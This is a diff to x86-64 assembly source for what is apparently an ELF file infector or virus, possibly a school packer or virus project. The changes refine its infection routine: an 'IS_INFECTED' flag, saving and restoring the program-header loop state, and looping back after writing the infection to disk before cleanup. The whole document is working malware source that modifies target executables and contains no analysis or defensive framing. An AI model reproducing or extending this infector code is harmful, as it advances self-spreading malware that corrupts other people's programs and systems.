@@ -140,6 +140,7 @@ _start:
   sub rsp, _start - decryptor
 
   mov r15, rsp ; r15 will be the base of our stack
+  mov byte [r15 + IS_INFECTED], 0 ; init this byte
 
   ; --- Re-open woody
   call .open_target2
@@ -189,7 +190,7 @@ _start:
   xor rbx, rbx ; initialize phdr loop counter
   xor r14, r14 ; initialize phdr file offset
 
-  .loop_phdr:
+  loop_phdr:
     ; -- Read one header
     mov rdi, r9 ; load fd into rdi
     lea rsi, [r15 + PHDR_TYPE] ; rsi holds phdr
@@ -220,12 +221,19 @@ _start:
     inc rbx ; add one to phdr loop counter
 
     cmp bx, word [r15 + EHDR_PHNUM] ; have we looped through all ehdr ?
-    jge exit_error
+    jl .continue_phdr_loop
 
-    add r8w, word [r15 + EHDR_PHENTSIZE] ; increment by ehdr_phentsize
-    jmp .loop_phdr ; loop back
+    cmp byte [r15 + IS_INFECTED], 1 ; have we infected the file ?
+    je cleanup ; done
+
+    .continue_phdr_loop:
+      add r8w, word [r15 + EHDR_PHENTSIZE] ; increment by ehdr_phentsize
+      jmp loop_phdr ; loop back
 
   .infect:
+    mov [r15 + PHDR_LOOP_COUNTER], bx ; store
+    mov [r15 + PHDR_LOOP_OFFSET], r8w ; store
+
     ; Get phdr file offset
     mov ax, bx ; move the loop counter previously in bx to ax
     mov dx, word [r15 + EHDR_PHENTSIZE] ; mov phentsize to dx
@@ -611,6 +619,11 @@ _start:
 
     mov rax, SYS_SYNC ; committing filesystem caches to disk
     syscall
+
+    mov bx, [r15 + PHDR_LOOP_COUNTER] ; restore
+    mov r8w, [r15 + PHDR_LOOP_OFFSET] ; restore
+    mov byte [r15 + IS_INFECTED], 1
+    jmp loop_phdr
 
 cleanup:
   mov rdi, [r15 + FD]
